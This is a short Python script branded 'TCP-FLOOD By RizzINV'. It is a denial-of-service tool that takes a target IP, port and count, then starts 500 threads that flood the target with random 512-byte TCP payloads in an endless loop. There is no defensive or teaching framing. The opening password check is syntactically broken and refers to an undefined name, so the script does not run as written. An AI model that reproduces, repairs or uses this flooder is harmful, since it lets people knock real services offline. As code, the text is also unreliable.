import os
import time
import threading
import socket
import random

password = int(input("Password : "))
pw = cumarizz

if password = pw
print("Correct Password")
else 
print("try again")
os.system("clear")

logo = """
□□□□□□□□□
□  RizzINV  □
□□□□□□□□□
"""
print(logo)
print("TCP-FLOOD By RizzINV")
ip = str(input("IP : "))
port = int(input("PORT : "))
times = int(input("TIME : "))
os.system("clear")

def tcpfl():
    rizz = random._urandom(512)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip,port))
            sock.send(rizz)
            for x in range(times):
                sock.send(rizz)
            print(f"Sending Flood to > ip : {ip} port : ${port} | with time => {times}")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            sock.close()
   
for x in range(500):
    t = threading.Thread(target=tcpfl)
    t.start()
